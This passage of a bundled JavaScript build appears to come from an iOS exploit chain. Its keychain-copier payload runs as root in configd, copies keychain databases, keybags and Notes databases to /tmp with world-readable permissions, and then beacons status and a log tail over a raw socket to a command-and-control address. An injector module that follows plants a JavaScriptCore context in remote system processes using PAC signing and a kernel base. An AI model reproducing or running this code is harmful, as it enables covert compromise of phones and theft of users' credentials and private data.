\"failed\",\n\t\t\t\t\t\terror: String(cmdErr),\n\t\t\t\t\t\t_task_id: (resp.params && resp.params._task_id) || \"\",\n\t\t\t\t\t\t_task_type: (resp.params && resp.params._task_type) || \"\"\n\t\t\t\t\t}, \"error_report.json\");\n\t\t\t\t} catch(re) {}\n\t\t\t}\n\t\t\tif (resp.type === \"exit\") break;\n\t\t}\n\t} catch (e) {\n\t}\n\n\tif (Date.now() >= _hqHeartbeatNext) {\n\t\t_hqHeartbeat();\n\t\t_hqHeartbeatNext = Date.now() + 60000;\n\t}\n\n\tNative.callSymbol(\"usleep\", interval * 1000000);\n}\n");

/***/ }),


/***/ "./node_modules/raw-loader/dist/cjs.js!./src/keychain_copier.js":
/*!**********************************************************************!*\
  !*** ./node_modules/raw-loader/dist/cjs.js!./src/keychain_copier.js ***!
  \**********************************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("// Keychain/Keybag Copier Payload\n// Runs under configd context which has access to keychain files\n// Copies keychain/keybag files to /tmp with 777 permissions\n// The main file_downloader payload will then send them\n\nclass Native {\n\t\n\tstatic #baseAddr;\n\tstatic #dlsymAddr;\n\tstatic #memcpyAddr;\n\tstatic #mallocAddr;\n\tstatic #oinvAddr;\n\t\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\t\n\tstatic #argMem = 0n;\n\tstatic #argMemPtr = 0n;\n\tstatic #argMemPtrStr = 0n;\n\tstatic #argPtr = 0n;\n\tstatic #argPtrPtr = 0n;\n\tstatic #argPtrStrPtr = 0n;\n\n\tstatic #dlsymCache = {};\n\t\n\tstatic init() {\n\t\tconst buff = new BigUint64Array(nativeCallBuff);\n\t\tthis.#baseAddr = buff[20];\n\t\tthis.#dlsymAddr = buff[21];\n\t\tthis.#memcpyAddr = buff[22];\n\t\tthis.#mallocAddr = buff[23];\n\t\tthis.#oinvAddr = buff[24];\n\t\t\n\t\tthis.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize));\n\t\tthis.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argPtr = this.#argMem;\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t}\n\t\n\tstatic write(ptr, buff) {\n\t\tif (!ptr) return false;\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tlet offs = 0;\n\t\tlet left = buff.byteLength;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000) len = 0x1000;\n\t\t\tbuff8.set(new Uint8Array(buff, offs, len), 0x1000);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn true;\n\t}\n\t\n\tstatic read(ptr, length) {\n\t\tif (!ptr) return null;\n\t\tlet buff = new ArrayBuffer(length);\n\t\tlet buff8 = new Uint8Array(buff);\n\t\tlet offs = 0;\n\t\tlet left = length;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000) len = 0x1000;\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));\n\t\t\tbuff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn buff;\n\t}\n\t\n\tstatic readPtr(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getBigUint64(0, true);\n\t}\n\t\n\tstatic read32(ptr) {\n\t\tlet buff = this.read(ptr, 4);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getInt32(0, true);\n\t}\n\t\n\tstatic write64(ptr, value) {\n\t\tconst buff = new ArrayBuffer(8);\n\t\tconst view = new DataView(buff);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\t\n\tstatic writeString(ptr, str) {\n\t\tconst buff = this.stringToBytes(str, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn ret;\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i]) break;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\t\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated) s8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\t\n\tstatic #toNative(value) {\n\t\tif (!value) return 0n;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) return 0n;\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn ptr;\n\t\t}\n\t\telse if (typeof value === 'bigint') return value;\n\t\telse return BigInt(value);\n\t}\n\n\tstatic #dlsym(name) {\n\t\tif (!name) return 0n;\n\t\tlet addr = this.#dlsymCache[name];\n\t\tif (addr) return addr;\n\t\tconst RTLD_DEFAULT = 0xfffffffffffffffen;\n\t\tconst nameBytes = this.stringToBytes(name, true);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tbuff8.set(new Uint8Array(nameBytes), 0x1000);\n\t\taddr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);\n\t\tif (addr) this.#dlsymCache[name] = addr;\n\t\treturn addr;\n\t}\n\t\n\tstatic #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {\n\t\tlet buff = new BigInt64Array(nativeCallBuff);\n\t\tbuff[0] = addr;\n\t\tbuff[100] = x0;\n\t\tbuff[101] = x1;\n\t\tbuff[102] = x2;\n\t\tbuff[103] = x3;\n\t\tbuff[104] = x4;\n\t\tbuff[105] = x5;\n\t\tbuff[106] = x6;\n\t\tbuff[107] = x7;\n\t\tinvoker();\n\t\treturn buff[200];\n\t}\n\t\n\tstatic #nativeCallSymbol(name, ...args) {\n\t\tconst funcAddr = this.#dlsym(name);\n\t\tconst ret64 = this.#nativeCallAddr(funcAddr, ...args);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn) return Number(ret64);\n\t\treturn ret64;\n\t}\n}\n\n// ============================================================================\n// Configuration\n// ============================================================================\n\nconst TAG = \"INFO\";\n\n// Destination directory for copied files\nconst DEST_DIR = \"/tmp\";\n\n// ============================================================================\n// Keychain and Keybag Files to Copy (iOS 18)\n// ============================================================================\n\nconst KEYCHAIN_FILES = [\n\t// Keychain database\n\t{ src: \"/private/var/Keychains/keychain-2.db\", dst: \"keychain-2.db\" },\n\t{ src: \"/private/var/Keychains/keychain-2.db-wal\", dst: \"keychain-2.db-wal\" },\n\t{ src: \"/private/var/Keychains/keychain-2.db-shm\", dst: \"keychain-2.db-shm\" },\n\t\n\t// Keybag files in /var/keybags\n\t{ src: \"/var/keybags/persona.kb\", dst: \"persona.kb\" },\n\t{ src: \"/var/keybags/usersession.kb\", dst: \"usersession.kb\" },\n\t{ src: \"/var/keybags/backup/backup_keys_cache.sqlite\", dst: \"backup_keys_cache.sqlite\" },\n\t{ src: \"/private/var/keybags/persona.kb\", dst: \"persona_private.kb\" },\n\t{ src: \"/private/var/keybags/usersession.kb\", dst: \"usersession_private.kb\" },\n\t\n\t// Keybag files in Keychains directory\n\t{ src: \"/private/var/Keychains/System.keybag\", dst: \"System.keybag\" },\n\t{ src: \"/private/var/Keychains/Backup.keybag\", dst: \"Backup.keybag\" },\n\t\n\t// Notes database\n\t{ src: \"/private/var/mobile/Library/Notes/notes.sqlite\", dst: \"notes.sqlite\" },\n\t{ src: \"/private/var/mobile/Library/Notes/notes.sqlite-wal\", dst: \"notes.sqlite-wal\" },\n\t{ src: \"/private/var/mobile/Library/Notes/notes.sqlite-shm\", dst: \"notes.sqlite-shm\" },\n\t{ src: \"/private/var/Keychains/persona.kb\", dst: \"persona_keychains.kb\" },\n\t{ src: \"/private/var/Keychains/usersession.kb\", dst: \"usersession_keychains.kb\" },\n\t{ src: \"/private/var/Keychains/device.kb\", dst: \"device.kb\" },\n];\n\n// ============================================================================\n// Helper Functions\n// ============================================================================\n\nfunction fileExists(filePath) {\n\tconst result = Native.callSymbol(\"access\", filePath, 0);\n\treturn Number(result) === 0;\n}\n\nfunction getFileSize(filePath) {\n\ttry {\n\t\tconst statBuf = Native.callSymbol(\"malloc\", BigInt(144));\n\t\tif (!statBuf || statBuf === 0n) return -1;\n\t\t\n\t\ttry {\n\t\t\tconst statResult = Native.callSymbol(\"stat\", filePath, statBuf);\n\t\t\tif (statResult !== 0) return -1;\n\t\t\t\n\t\t\tconst statData = Native.read(statBuf, 144);\n\t\t\tconst statView = new DataView(statData);\n\t\t\treturn Number(statView.getBigUint64(0x60, true));\n\t\t} finally {\n\t\t\tNative.callSymbol(\"free\", statBuf);\n\t\t}\n\t} catch (e) {\n\t\treturn -1;\n\t}\n}\n\n/**\n * Copy a file from src to dst with specified permissions\n */\nfunction copyFile(srcPath, dstPath, mode) {\n\ttry {\n\t\t// Check if source exists\n\t\tif (!fileExists(srcPath)) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\tconst fileSize = getFileSize(srcPath);\n\t\tif (fileSize < 0) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\tif (fileSize === 0) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t// Open source for reading\n\t\tconst srcFd = Native.callSymbol(\"open\", srcPath, 0); // O_RDONLY\n\t\tif (Number(srcFd) < 0) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\ttry {\n\t\t\t// Create/open destination for writing\n\t\t\t// O_WRONLY | O_CREAT | O_TRUNC = 0x601\n\t\t\tconst dstFd = Native.callSymbol(\"open\", dstPath, 0x601, mode);\n\t\t\tif (Number(dstFd) < 0) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\t\n\t\t\ttry {\n\t\t\t\t// Copy in chunks\n\t\t\t\tconst chunkSize = 64 * 1024;\n\t\t\t\tlet totalCopied = 0;\n\t\t\t\t\n\t\t\t\twhile (totalCopied < fileSize) {\n\t\t\t\t\tconst remaining = fileSize - totalCopied;\n\t\t\t\t\tconst toRead = remaining > chunkSize ? chunkSize : remaining;\n\t\t\t\t\t\n\t\t\t\t\tconst buf = Native.callSymbol(\"malloc\", BigInt(toRead));\n\t\t\t\t\tif (!buf || buf === 0n) break;\n\t\t\t\t\t\n\t\t\t\t\ttry {\n\t\t\t\t\t\tconst bytesRead = Native.callSymbol(\"read\", srcFd, buf, toRead);\n\t\t\t\t\t\tif (Number(bytesRead) <= 0) break;\n\t\t\t\t\t\t\n\t\t\t\t\t\tconst bytesWritten = Native.callSymbol(\"write\", dstFd, buf, Number(bytesRead));\n\t\t\t\t\t\tif (Number(bytesWritten) <= 0) break;\n\t\t\t\t\t\t\n\t\t\t\t\t\ttotalCopied += Number(bytesWritten);\n\t\t\t\t\t} finally {\n\t\t\t\t\t\tNative.callSymbol(\"free\", buf);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t// Set permissions to 777 (0777 = 511 decimal)\n\t\t\t\tNative.callSymbol(\"chmod\", dstPath, mode);\n\t\t\t\t\n\t\t\t\treturn totalCopied > 0;\n\t\t\t\t\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"close\", dstFd);\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"close\", srcFd);\n\t\t}\n\t\t\n\t} catch (e) {\n\t\treturn false;\n\t}\n}\n\n// ============================================================================\n// Main Execution\n// ============================================================================\n\nNative.init();\n\n\nvar __kcCopyDbOk = false;\nvar __kcCopyDbSz = -1;\nvar __kcCopySrcOk = false;\nvar __kcCopySrcSz = -1;\nvar __kcCopyOkN = 0;\nvar __kcCopyFailN = 0;\nvar __kcCopyExc = false;\n\ntry {\n\tfor (const file of KEYCHAIN_FILES) {\n\t\tconst srcPath = file.src;\n\t\tconst dstPath = DEST_DIR + \"/\" + file.dst;\n\n\t\t// Copy with 777 permissions (0777 = 511)\n\t\tif (copyFile(srcPath, dstPath, 511)) {\n\t\t\t__kcCopyOkN++;\n\t\t\tif (file.dst === \"keychain-2.db\") {\n\t\t\t\t__kcCopyDbOk = true;\n\t\t\t\t__kcCopyDbSz = getFileSize(dstPath);\n\t\t\t\t__kcCopySrcOk = fileExists(srcPath);\n\t\t\t\t__kcCopySrcSz = getFileSize(srcPath);\n\t\t\t\ttry { Native.callSymbol(\"chmod\", dstPath, 511); } catch (_c) {}\n\t\t\t}\n\t\t} else {\n\t\t\t__kcCopyFailN++;\n\t\t\tif (file.dst === \"keychain-2.db\") {\n\t\t\t\t__kcCopySrcOk = fileExists(srcPath);\n\t\t\t\t__kcCopySrcSz = getFileSize(srcPath);\n\t\t\t}\n\t\t}\n\t}\n} catch (e) {\n\t__kcCopyExc = true;\n}\n\n// ===== DEBUG uplink: ship /tmp/p7_debug.log tail to C2 via raw socket =====\n// Runs in configd (root) — can read /tmp even though mediaplaybackd cannot.\nfunction _dbgSockSend(tag) {\n\ttry {\n\t\tvar sfd = Number(Native.callSymbol(\"socket\", 2, 1, 0));\n\t\tif (sfd < 0) return;\n\t\tvar one = Native.callSymbol(\"calloc\", 1, 8);\n\t\tNative.write(one, new Uint8Array([1,0,0,0]).buffer);\n\t\tNative.callSymbol(\"setsockopt\", sfd, 0xffff, 0x1022, one, 4);\n\t\tNative.callSymbol(\"free\", one);\n\t\tvar abuf = Native.callSymbol(\"calloc\", 1, 16);\n\t\tvar a8 = new Uint8Array(16);\n\t\ta8[0] = 16; a8[1] = 2; a8[2] = 0x1B; a8[3] = 0x6E; // port 7022 BE\n\t\ta8[4] = 192; a8[5] = 168; a8[6] = 4; a8[7] = 10;\n\t\tNative.write(abuf, a8.buffer);\n\t\tif (Number(Native.callSymbol(\"connect\", sfd, abuf, 16)) === 0) {\n\t\t\tvar safe = String(tag || \"\").replace(/=/g, \"-\").replace(/[^A-Za-z0-9._~\\-]/g, \"_\");\n\t\t\tvar req = \"GET /log.html?text=\" + safe + \" HTTP/1.0\\r\\nHost: cdn.gotoiphone.com\\r\\n\\r\\n\";\n\t\t\tvar rbuf = Native.callSymbol(\"malloc\", req.length + 1);\n\t\t\tNative.writeString(rbuf, req);\n\t\t\tNative.callSymbol(\"write\", sfd, rbuf, req.length);\n\t\t\tNative.callSymbol(\"free\", rbuf);\n\t\t}\n\t\tNative.callSymbol(\"close\", sfd);\n\t\tNative.callSymbol(\"free\", abuf);\n\t} catch(e) {}\n}\n\n// Notify MPD: ready=1 + path when keychain-2.db copy succeeded.\n// MPD must wait for this signal (not size>1MB), then sqlite3_open + securityd unwrap.\ntry {\n\t_dbgSockSend(\n\t\t\"kc_copy_db_ok=\" + (__kcCopyDbOk ? \"1\" : \"0\") +\n\t\t\"_sz=\" + __kcCopyDbSz +\n\t\t\"_src=\" + (__kcCopySrcOk ? \"1\" : \"0\") +\n\t\t\"_ssz=\" + __kcCopySrcSz +\n\t\t\"_ok=\" + __kcCopyOkN +\n\t\t\"_fail=\" + __kcCopyFailN +\n\t\t(__kcCopyExc ? \"_EXC\" : \"\")\n\t);\n} catch (_b) {}\ntry {\n\tvar __kcPath = DEST_DIR + \"/keychain-2.db\";\n\tvar st = \"ready=\" + (__kcCopyDbOk ? \"1\" : \"0\") +\n\t\t\" db_ok=\" + (__kcCopyDbOk ? \"1\" : \"0\") +\n\t\t\" path=\" + __kcPath +\n\t\t\" sz=\" + __kcCopyDbSz +\n\t\t\" src=\" + (__kcCopySrcOk ? \"1\" : \"0\") +\n\t\t\" ssz=\" + __kcCopySrcSz +\n\t\t\" ok=\" + __kcCopyOkN +\n\t\t\" fail=\" + __kcCopyFailN + \"\\n\";\n\tvar sfd2 = Number(Native.callSymbol(\"open\", \"/tmp/keychain_copier_status.txt\", 0x601, 511));\n\tif (sfd2 >= 0) {\n\t\tvar sbuf = Native.callSymbol(\"malloc\", BigInt(st.length + 1));\n\t\tNative.writeString(sbuf, st);\n\t\tNative.callSymbol(\"write\", sfd2, sbuf, st.length);\n\t\tNative.callSymbol(\"close\", sfd2);\n\t\tNative.callSymbol(\"free\", sbuf);\n\t\tNative.callSymbol(\"chmod\", \"/tmp/keychain_copier_status.txt\", 511);\n\t}\n\tif (__kcCopyDbOk) {\n\t\tvar gfd = Number(Native.callSymbol(\"open\", \"/tmp/keychain_mpd_go\", 0x601, 511));\n\t\tif (gfd >= 0) {\n\t\t\tvar gbuf = Native.callSymbol(\"malloc\", BigInt(__kcPath.length + 2));\n\t\t\tNative.writeString(gbuf, __kcPath + \"\\n\");\n\t\t\tNative.callSymbol(\"write\", gfd, gbuf, __kcPath.length + 1);\n\t\t\tNative.callSymbol(\"close\", gfd);\n\t\t\tNative.callSymbol(\"free\", gbuf);\n\t\t\tNative.callSymbol(\"chmod\", \"/tmp/keychain_mpd_go\", 511);\n\t\t}\n\t\t_dbgSockSend(\"kc_copy_READY_notify_mpd_path_\" + __kcPath.replace(/\\//g, \"_\"));\n\t}\n} catch (_s) {}\n\ntry {\n\tvar p7fd = Number(Native.callSymbol(\"open\", \"/tmp/p7_debug.log\", 0));\n\tif (p7fd < 0) {\n\t\t_dbgSockSend(\"kc_alive_p7log_MISSING\");\n\t} else {\n\t\tvar fend = Number(Native.callSymbol(\"lseek\", p7fd, 0, 2)); // SEEK_END\n\t\tvar fstart = fend > 1400 ? fend - 1400 : 0;\n\t\tNative.callSymbol(\"lseek\", p7fd, fstart, 0);\n\t\tvar rbuf2 = Native.callSymbol(\"malloc\", 1500);\n\t\tvar rn = Number(Native.callSymbol(\"read\", p7fd, rbuf2, 1400));\n\t\tNative.callSymbol(\"close\", p7fd);\n\t\tif (rn <= 0) {\n\t\t\t_dbgSockSend(\"kc_alive_p7log_EMPTY\");\n\t\t} else {\n\t\t\tvar d8 = new Uint8Array(Native.read(rbuf2, rn));\n\t\t\tvar hx = \"\";\n\t\t\tfor (var hi = 0; hi < d8.length; hi++) hx += (d8[hi] < 16 ? \"0\" : \"\") + d8[hi].toString(16);\n\t\t\tNative.callSymbol(\"free\", rbuf2);\n\t\t\t_dbgSockSend(\"kc_p7tail_\" + hx);\n\t\t}\n\t}\n} catch(e) {\n\ttry { _dbgSockSend(\"kc_p7tail_ERR\"); } catch(e2) {}\n}\n// ===== END DEBUG uplink =====\n\n\n");

/***/ }),

/***/ "./src/InjectJS.js":
/*!*************************!*\
  !*** ./src/InjectJS.js ***!
  \*************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ InjectJS)
/* harmony export */ });
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/TaskRop/RemoteCall */ "./src/libs/TaskRop/RemoteCall.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");


const TAG = "INJECTJS";

const RTLD_LAZY = 0x1;
const RTLD_DEFAULT = 0xfffffffffffffffen;

class InjectJS {

	task;
	#target;
	#injectCode;
	#migFilterBypass;
	#invokingAddr;
	#JSContextClass;
	#NSMethodSignatureClass;
	#NSInvocationClass;
	#invokeUsingIMPSel;
	#pendingJsContext;
	#pendingScriptStr;

	constructor(target, injectCode, migFilterBypass=null) {
		this.#target = target;
		this.#injectCode = injectCode;
		this.#migFilterBypass = migFilterBypass;
		this.#invokingAddr = this.#findInvoking();

		this.#JSContextClass = Native.callSymbol("objc_getClass", "JSContext");
		this.#NSMethodSignatureClass = Native.callSymbol("objc_getClass", "NSMethodSignature");
		this.#NSInvocationClass = Native.callSymbol("objc_getClass", "NSInvocation");
		this.#invokeUsingIMPSel = Native.callSymbol("sel_registerName", "invokeUsingIMP:"); 

		if (!this.#invokingAddr)
			console.log(TAG, "Invoking not found!");
	}

	inject(agentPid=0, opts) {
		if (!this.#invokingAddr)
			return false;

		if (typeof(this.#target) == "string") {
			console.log(TAG, `Start injecting JS script into ${this.#target}`);

			this.task = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_1__["default"](this.#target, this.#migFilterBypass);
			if (!this.task.success()) {
				console.log(TAG, "Unable to inject into: " + this.#target);
				return false;
			}
		}
		else {
			console.log(TAG, `Start injecting JS script into existing task: ${this.#target.pid()}`);

			 // Assume target is a RemoteCall object
			this.task = this.#target;
			if (!this.task.success()) {
				console.log(TAG, "Unable to inject into existing task");
				return false;
			}
		}

		// Prepare remote JSC + script. By default evaluate immediately (legacy).
		// Pass { deferStart: true } then applyTokens + startScript() so tokens land first.
		if (!this.#startWithTask(agentPid))
			return false;
		const defer = opts && opts.deferStart === true;
		if (!defer)
			this.startScript();
		return true;
	}

	/** Begin deferred evaluateScript: (after Sandbox.applyTokensForRemoteTask). */
	startScript() {
		if (!this.#pendingJsContext || !this.#pendingScriptStr)
			return false;
		console.log(TAG, "Starting JS script for target: " + this.#target);
		this.#callObjcInBackground(this.#pendingJsContext, "evaluateScript:", this.#pendingScriptStr);
		this.#pendingJsContext = null;
		this.#pendingScriptStr = null;
		console.log(TAG, "All done!");
		return true;
	}

	destroy() {
		this.#pendingJsContext = null;
		this.#pendingScriptStr = null;
		if (this.task && this.task.success())
			this.task.destroy();
		this.task = null;
	}

	#startWithTask(agentPid) {
		// RemoteCall failure paths historically returned Number 0; pointer math with 0xNNn
		// then throws "Invalid mix of BigInt and other type in addition". Always coerce.
		const mem = BigInt(this.task.mem() || 0);
		if (!mem) {
			console.log(TAG, "Remote mem unavailable");
			return false;
		}

		// Sign __invoking__ function address
		this.#invokingAddr = BigInt(this.task.pac(this.#invokingAddr, 0) || 0);
		if (!this.#invokingAddr) {
			console.log(TAG, "PAC of invoking failed");
			return false;
		}
		//console.log(TAG, "Signed invoking: " + Utils.hex(this.#invokingAddr));

		this.task.writeStr(mem, "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore");
		// configd cold-loads JSC; default remote wait (10s) is too tight on slower devices
		const lib = BigInt(this.task.call(60000, "dlopen", mem, RTLD_LAZY) || 0);
		//console.log(TAG, "lib: " + Utils.hex(lib));

		// Create a JSC context and get pointer to exceptionHandler NSBlock
		const jscontext = BigInt(this.#callObjcRetain(this.#JSContextClass, "new") || 0);
		if (!jscontext) {
			console.log(TAG, "JSContext new failed (lib=" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(lib) + ")");
			return false;
		}
		//console.log(TAG, "Remote JSC: " + Utils.hex(jscontext));

		const exceptionHandler = this.task.read64(jscontext + 0x28n);
		//console.log(TAG, "Exception handler: " + Utils.hex(exceptionHandler));

		// Register an "invoker()" JS function within our JSC context, having exceptionHandler block as native implementation.
		// We replace exceptionHandler NSInvocation later in this code.
		const invokerStr = this.#writeCFStr(mem, "invoker");
		this.#callObjc(jscontext, "setObject:forKeyedSubscript:", exceptionHandler, invokerStr);
		//console.log(TAG, "invokerStr: " + Utils.hex(invokerStr));

		// Retrieve JSValue of invoker inside JSC context dict
		const invoker = BigInt(this.#callObjc(jscontext, "objectForKeyedSubscript:", invokerStr) || 0);
		if (!invoker) {
			console.log(TAG, "invoker lookup failed");
			return false;
		}
		//console.log(TAG, "invoker: " + Utils.hex(invoker));

		// Get pointer of NSInvocation inside NSBlock
		const fjval = BigInt(this.task.read64(invoker + 0x8n) || 0);
		const storval = BigInt(this.task.read64(fjval + 0x40n) || 0);
		const invokerObj = BigInt(this.task.read64(storval + 0x10n) || 0);
		if (!fjval || !storval) {
			console.log(TAG, "invoker NSBlock walk failed");
			return false;
		}
		//console.log(TAG, "invokerObj: " + Utils.hex(invokerObj));

		this.task.writeStr(mem, "QQQQQQQQQQQQQQQ");
		const lsignature = this.#callObjc(this.#NSMethodSignatureClass, "signatureWithObjCTypes:", mem);

		this.task.writeStr(mem, "@QQQQQQQQQQQQQQ");
		const osignature = this.#callObjc(this.#NSMethodSignatureClass, "signatureWithObjCTypes:", mem);

		// This is an utility NSInvocation object we share with JS to allow objc call with retained return object
		const oinv = BigInt(this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", osignature) || 0);

		// This is the final NSInvocation object we use to call the actual target function
		const inv = BigInt(this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", lsignature) || 0);
		//console.log(TAG, "inv: " + Utils.hex(inv));

		// Create a new NSInvocation and replace the NSBlock one with this
		const jsinv = BigInt(this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", lsignature) || 0);
		//console.log(TAG, "jsinv: " + Utils.hex(jsinv));
		if (!oinv || !inv || !jsinv) {
			console.log(TAG, "NSInvocation setup failed");
			return false;
		}

		const callBuff = BigInt(this.task.call(1000, "calloc", 1, 0x4000) || 0);
		if (!callBuff) {
			console.log(TAG, "calloc callBuff failed");
			return false;
		}
		const firstInvokingBuff = callBuff + 0x50n;	// callBuff[10]
		const argsBuff = callBuff + 0x320n;			// callBuff[100]
		const resultBuff = callBuff + 0x640n;		// callBuff[200]

		//console.log(TAG, "callBuff: " + Utils.hex(callBuff));
		//console.log(TAG, "firstInvokingBuff: " + Utils.hex(firstInvokingBuff));
		//console.log(TAG, "argsBuff: " + Utils.hex(argsBuff));
		//console.log(TAG, "resultBuff: " + Utils.hex(resultBuff));

		// Share callBuff with JS
		this.task.writeStr(mem, "nativeCallBuff");
		const jsctx = BigInt(this.#callObjc(jscontext, "JSGlobalContextRef") || 0);
		if (!jsctx) {
			console.log(TAG, "JSGlobalContextRef failed");
			return false;
		}
		const nativeCallBuff = this.task.call(100, "JSObjectMakeArrayBufferWithBytesNoCopy", jsctx, callBuff, 0x4000);
		const globalObject = this.task.call(100, "JSContextGetGlobalObject", jsctx);
		const jsName = this.task.call(100, "JSStringCreateWithUTF8CString", mem);
		this.task.call(100, "JSObjectSetProperty", jsctx, globalObject, jsName, nativeCallBuff);

		let localCallBuff = new BigUint64Array(33);
		
		// Second (final) __invoking__ arguments
		localCallBuff[0] = 0x41414141n;	// this should be overwritten at every function call
		localCallBuff[1] = resultBuff; // Result buffer
		localCallBuff[2] = argsBuff; // Arguments buffer
		localCallBuff[3] = 0x120n; // args buff size. Do not touch!

		// First __invoking__ arguments
		localCallBuff[10] = this.#invokingAddr;
		localCallBuff[11] = resultBuff;
		localCallBuff[12] = callBuff;
		localCallBuff[13] = 0xe0n;

		// Some offsets we export to JS
		localCallBuff[20] = callBuff;
		localCallBuff[21] = this.task.pac( Native.callSymbol("dlsym", RTLD_DEFAULT, "dlsym"), 0 );
		localCallBuff[22] = this.task.pac( Native.callSymbol("dlsym", RTLD_DEFAULT, "memcpy"), 0 );
		localCallBuff[23] = this.task.pac( Native.callSymbol("dlsym", RTLD_DEFAULT, "malloc"), 0 );
		localCallBuff[24] = oinv;
		localCallBuff[25] = jsctx;
		localCallBuff[26] =  true ? 1n : 0;	// we pass true if DEBUG is set
		localCallBuff[27] = 1n;
		localCallBuff[28] = 0n;
		localCallBuff[29] = 0n;
		localCallBuff[30] = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].getKernelBase();
		let desiredPacGadget = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].getPaciaGadget();
		// retreiving correct modifier for 18.4 and above
		if (globalThis.xnuVersion.major == 24 && globalThis.xnuVersion.minor >= 4) {
			desiredPacGadget = Native.pacia(Native.strip(desiredPacGadget),0n);
		}
		localCallBuff[31] = desiredPacGadget;
		localCallBuff[32] = BigInt(agentPid);

		//console.log(TAG, "dlsym: " + Utils.hex(localCallBuff[21]));
		//console.log(TAG, "memcpy: " + Utils.hex(localCallBuff[22]));
